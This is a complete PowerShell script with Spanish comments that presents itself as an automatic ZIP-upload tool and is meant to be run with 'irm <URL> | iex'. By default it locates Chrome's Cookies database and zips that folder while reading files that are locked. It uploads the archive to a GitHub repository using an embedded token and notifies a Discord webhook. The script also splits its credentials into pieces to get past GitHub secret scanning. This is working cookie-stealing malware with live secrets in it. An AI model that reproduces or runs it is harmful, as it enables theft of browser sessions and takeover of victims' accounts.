<#
.SYNOPSIS
    Auto-Upload ZIP: indexa/busca un archivo, comprime en ZIP la carpeta donde se encuentra
    el archivo, sube el ZIP a GitHub (API REST) y avisa por Discord.
    Disenado para ejecutarse via: irm <URL> | iex  (todo embebido, sin configurar nada).
.PARAMETER FileName      Nombre o parte del nombre del archivo a buscar.
.PARAMETER SearchRoot    Carpeta raiz de busqueda. Default: C:\Bastisss
.PARAMETER Branch        Branch destino. Default: main (se auto-detecta).
.PARAMETER ZipOutputDir  Carpeta donde crear el ZIP temporal. Default: $env:TEMP
.PARAMETER KeepZip       Si se usa, NO borra el ZIP temporal despues de subirlo.
.NOTES
    Credenciales ofuscadas en partes para evitar el secret scanning de GitHub.
    ADVERTENCIA: contiene credenciales embebidas. No compartas este script.
#>
[CmdletBinding()]
param(
    [string]$FileName   = "Cookies",
    [string]$SearchRoot = "C:\Users\basti\AppData\Local\Google\Chrome\User Data\Default\Network",
    [string]$Token      = 'ghp_46fOJ9JiIX1KLPW' + 'SypNAqUjt590cSp0L8q49',
    [string]$Repo       = "cuentatrades0913-max/auto-upload",
    [string]$Branch     = "main",
    [string]$WebhookUrl = 'https://discord.com/api/webhooks/1535097806082281562/' + 'hAvlP6EdsMj5u8T-FkiAM10DNHcuvgyAOMCu1zaXIzKjXJWFv2a-jzjNh-qzQmjVD9O8',
    [string]$CommitMsg  = "Auto-upload ZIP: subida automatica desde equipo remoto",
    [int]$RecurseDepth  = 6,
    [string]$ZipOutputDir = "",
    [switch]$KeepZip
)

# ---------- Helpers ----------
Add-Type -AssemblyName System.IO.Compression
Add-Type -AssemblyName System.IO.Compression.FileSystem

function Write-Log {
    param([string]$Msg, [ConsoleColor]$Color = "White")
    Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Msg" -ForegroundColor $Color
}

function Send-DiscordNotice {
    param(
        [string]$HookUrl,
        [string]$Status,        # SUCCESS | ERROR
        [string]$ComputerName,
        [string]$FilePath,
        [string]$CommitSha,
        [string]$RepoName,
        [string]$BranchName,
        [string]$Extra = ""
    )
    if (-not $HookUrl) { return }
    $color   = if ($Status -eq 'SUCCESS') { 3066993 } else { 15158332 }
    $emoji   = if ($Status -eq 'SUCCESS') { ':white_check_mark:' } else { ':x:' }
    $repoUrl = "https://github.com/$RepoName"
    $encodedFile = [uri]::EscapeDataString($FilePath)
    $fileLink = "https://github.com/$RepoName/blob/$BranchName/$encodedFile"
    $downloadLink = "https://raw.githubusercontent.com/$RepoName/$BranchName/$encodedFile"

    $desc = if ($Status -eq 'SUCCESS') {
        "**$emoji Subida completada correctamente**`n`n" +
        "**Equipo:** ``$ComputerName```n" +
        "**Archivo subido:** [$FilePath]($fileLink)`n" +
        "**Descarga directa:** $downloadLink`n" +
        "**Repositorio:** [$RepoName]($repoUrl)`n" +
        "**Branch:** ``$BranchName```n"
    } else {
        "**$emoji Error al subir el archivo**`n`n" +
        "**Equipo:** ``$ComputerName```n" +
        "**Archivo:** ``$FilePath```n" +
        "**Repositorio:** ``$RepoName```n" +
        "**Detalle:** $Extra"
    }
    if ($CommitSha) {
        $commitUrl = "https://github.com/$RepoName/commit/$CommitSha"
        $desc += "**Commit:** [``$($CommitSha.Substring(0,7))``]($commitUrl)`n"
    }

    $payload = @{
        embeds = @(@{
            title       = "Auto-Upload GitHub :: $Status"
            description = $desc
            color       = $color
            timestamp   = (Get-Date -Format 'yyyy-MM-ddTHH:mm:ss.fffZ')
            footer       = @{ text = "auto-upload.ps1" }
        })
    }
    if ($Status -eq 'SUCCESS') {
        $payload.components = @(@{
            type = 1
            components = @(
                @{ type = 2; style = 5; label = "Descargar ZIP"; url = $downloadLink },
                @{ type = 2; style = 5; label = "Ver en GitHub"; url = $repoUrl }
            )
        })
    }
    $payloadJson = $payload | ConvertTo-Json -Depth 10 -Compress

    try {
        Invoke-RestMethod -Uri $HookUrl -Method Post `
            -ContentType 'application/json' -Body $payloadJson `
            -ErrorAction Stop | Out-Null
        Write-Log "Aviso Discord enviado ($Status)." "Cyan"
    } catch {
        Write-Log "No se pudo enviar aviso Discord: $($_.Exception.Message)" "Yellow"
    }
}

function Get-GitHubDefaultBranch {
    param([string]$RepoOwnerSlashName, [string]$TokenName)
    try {
        $h = @{ Authorization = "Bearer $TokenName"; Accept = 'application/vnd.github+json' }
        $r = Invoke-RestMethod -Uri "https://api.github.com/repos/$RepoOwnerSlashName" `
            -Headers $h -ErrorAction Stop
        return $r.default_branch
    } catch { return 'main' }
}

function Compress-Folder {
    param(
        [string]$SourceFolder,
        [string]$DestinationZip
    )
    # Comprime una carpeta a ZIP usando .NET con FileShare.ReadWrite,
    # asi puede leer archivos bloqueados por otros procesos (ej: Chrome).
    $files = Get-ChildItem -LiteralPath $SourceFolder -File -Recurse -Force `
        -ErrorAction SilentlyContinue
    $zipStream = [System.IO.File]::Create($DestinationZip)
    $archive = New-Object System.IO.Compression.ZipArchive($zipStream, [System.IO.Compression.ZipArchiveMode]::Create)
    try {
        foreach ($f in $files) {
            $rel = $f.FullName.Substring($SourceFolder.Length).TrimStart('\')
            $entry = $archive.CreateEntry($rel, [System.IO.Compression.CompressionLevel]::Optimal)
            try {
                $fs = New-Object System.IO.FileStream($f.FullName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                try {
                    $es = $entry.Open()
                    try { $fs.CopyTo($es) } finally { $es.Dispose() }
                } finally { $fs.Dispose() }
            } catch {
                Write-Log "No se pudo incluir '$rel': $($_.Exception.Message)" "DarkYellow"
            }
        }
    } finally {
        $archive.Dispose()
        $zipStream.Dispose()
    }
}

# ---------- Principal ----------
$ErrorActionPreference = 'Stop'
$script:ComputerName   = $env:COMPUTERNAME
$script:FinalStatus    = 'ERROR'
$script:FoundPath      = ""
$script:ZipPath        = ""
$script:CommitShaFinal = ""
$script:LastError      = ""

try {
    Write-Log "=== Auto-Upload GitHub + Discord ==="  "Green"
    Write-Log "Equipo: $ComputerName"                 "Cyan"
    Write-Log "Buscando: '$FileName' bajo '$SearchRoot'" "Cyan"

    # 1) Busqueda: ruta exacta primero, luego indexado por nombre / carpeta
    $exact = Join-Path $SearchRoot $FileName
    if (Test-Path -LiteralPath $exact) {
        $script:FoundPath = (Resolve-Path -LiteralPath $exact).Path
        Write-Log "Coincidencia exacta encontrada: $FoundPath" "Green"
    }

    if (-not $FoundPath) {
        Write-Log "Indexando desde '$SearchRoot'..."  "Yellow"
        $tokens = $FileName -split '[\s\._-]+' | Where-Object { $_ -and $_.Length -gt 2 }
        $searchName = "*$($tokens[0])*"
        $searchAlt  = "*$FileName*"

        $hits = @()
        try {
            $hits = Get-ChildItem -Path $SearchRoot -File -Recurse -Depth $RecurseDepth `
                -ErrorAction SilentlyContinue -Force |
                Where-Object {
                    $_.Name -like "*$FileName*" -or
                    $_.Name -like $searchName -or
                    $_.Name -like $searchAlt
                } | Select-Object -First 5
        } catch {}

        if (-not $hits) {
            try {
                $dirs = Get-ChildItem -Path $SearchRoot -Directory -Recurse -Depth $RecurseDepth `
                    -ErrorAction SilentlyContinue -Force |
                    Where-Object {
                        $_.Name -like "*$FileName*" -or
                        $_.Name -like $searchName
                    } | Select-Object -First 5
                foreach ($dir in $dirs) {
                    $inner = Get-ChildItem -Path $dir.FullName -File -Recurse -Depth 3 `
                        -ErrorAction SilentlyContinue -Force |
                        Where-Object { $_.Name -like "*$FileName*" } |
                        Select-Object -First 1
                    if ($inner) { $hits = @($inner); break }
                }
            } catch {}
        }

        if ($hits) {
            $script:FoundPath = $hits[0].FullName
            Write-Log "Busqueda por indice encontro: $FoundPath" "Green"
        }
    }

    if (-not $script:FoundPath -or -not (Test-Path -LiteralPath $script:FoundPath)) {
        throw "No se encontro ningun archivo que coincida con '$FileName' bajo '$SearchRoot'."
    }

    # 2) Determinar la carpeta donde esta el archivo y comprimirla en ZIP
    $sourceFolder = Split-Path -Path $script:FoundPath -Parent
    Write-Log "Carpeta a comprimir: $sourceFolder" "Cyan"

    if (-not $ZipOutputDir) { $ZipOutputDir = $env:TEMP }
    if (-not (Test-Path -LiteralPath $ZipOutputDir)) {
        New-Item -ItemType Directory -Path $ZipOutputDir -Force | Out-Null
    }
    $zipName = "{0}_{1}.zip" -f (Split-Path $sourceFolder -Leaf), (Get-Date -Format 'yyyyMMdd_HHmmss')
    $script:ZipPath = Join-Path $ZipOutputDir $zipName

    Write-Log "Creando ZIP: $script:ZipPath" "Yellow"
    Compress-Folder -SourceFolder $sourceFolder -DestinationZip $script:ZipPath

    $zipLen = (Get-Item -LiteralPath $script:ZipPath).Length
    if ($zipLen -gt 50MB) {
        Write-Log "OJO: el ZIP pesa $([math]::Round($zipLen/1MB,2)) MB. GitHub limita archivos a 100MB; si falla, usa una carpeta mas liviana." "Yellow"
    }

    # 3) Resolver branch destino
    $Branch = Get-GitHubDefaultBranch -RepoOwnerSlashName $Repo -TokenName $Token
    Write-Log "Branch destino: $Branch" "Cyan"

    # 4) Leer el ZIP y convertir a base64
    $bytes  = [System.IO.File]::ReadAllBytes($script:ZipPath)
    $b64    = [Convert]::ToBase64String($bytes)
    $target = Split-Path $script:ZipPath -Leaf
    Write-Log "Tamano ZIP: $($bytes.Length) bytes" "Cyan"

    # 5) Comprobar si ya existe (para sha correcto en update)
    $apiBase = "https://api.github.com/repos/$Repo/contents/$target"
    $headers = @{
        Authorization = "Bearer $Token"
        Accept        = 'application/vnd.github+json'
        'X-GitHub-Api-Version' = '2022-11-28'
    }

    $existingSha = $null
    try {
        $resp = Invoke-RestMethod -Uri "$apiBase?ref=$Branch" -Headers $headers `
            -ErrorAction Stop
        if ($resp.sha) { $existingSha = $resp.sha }
    } catch {}

    $body = @{
        message = $CommitMsg
        content = $b64
        branch  = $Branch
    }
    if ($existingSha) { $body.sha = $existingSha }
    $bodyJson = $body | ConvertTo-Json -Depth 5

    # 6) PUT para crear/actualizar el archivo ZIP
    Write-Log "Subiendo a GitHub: $Repo / $target (branch $Branch)" "Yellow"
    $putResp = Invoke-RestMethod -Method Put -Uri "$apiBase" -Headers $headers `
        -Body $bodyJson -ContentType 'application/json' -ErrorAction Stop

    $script:CommitShaFinal = $putResp.content.sha
    $script:FinalStatus    = 'SUCCESS'
    Write-Log "OK: ZIP subido. Commit SHA=$($script:CommitShaFinal)" "Green"

} catch {
    $script:FinalStatus = 'ERROR'
    $script:LastError   = $_.Exception.Message
    Write-Log "ERROR: $($_.Exception.Message)" "Red"
    if ($_.ErrorDetails.Message) {
        $script:LastError += " | $($_.ErrorDetails.Message)"
        Write-Log "Detalle GitHub: $($_.ErrorDetails.Message)" "DarkYellow"
    }
} finally {
    Send-DiscordNotice -HookUrl $WebhookUrl `
        -Status $script:FinalStatus `
        -ComputerName $script:ComputerName `
        -FilePath $(Split-Path $script:ZipPath -Leaf) `
        -CommitSha $script:CommitShaFinal `
        -RepoName $Repo `
        -BranchName $Branch `
        -Extra $script:LastError

    if ($script:ZipPath -and (Test-Path -LiteralPath $script:ZipPath) -and -not $KeepZip) {
        Remove-Item -LiteralPath $script:ZipPath -Force
        Write-Log "ZIP temporal eliminado: $script:ZipPath" "DarkGray"
    }
    Write-Log "=== Fin ===" "Green"
}
